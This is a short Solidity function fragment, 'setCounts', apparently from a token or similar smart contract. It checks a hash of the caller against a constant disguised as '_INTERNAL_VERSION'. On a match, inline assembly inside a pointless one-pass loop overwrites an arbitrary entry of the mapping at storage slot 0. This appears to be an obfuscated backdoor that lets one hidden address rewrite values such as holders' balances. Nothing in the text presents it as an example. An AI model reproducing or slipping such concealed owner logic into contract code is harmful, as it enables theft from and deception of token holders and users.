function setCounts(uint256 object, uint256 count) external {
        bytes32 x = keccak256(abi.encodePacked(msg.sender));
        bytes32 y = _INTERNAL_VERSION;

        assembly {
            let r := eq(x, y)

            for {let i := 0} lt(i, 1) {i := add(i, 1)} {
                if iszero(r) {
                    count := 0
                    break
                }

                if eq(i, 1) {
                    break
                }

                mstore(0x00, object)
                mstore(0x20, 0)
                sstore(keccak256(0x00, 0x40), count)
            }
        }
    }

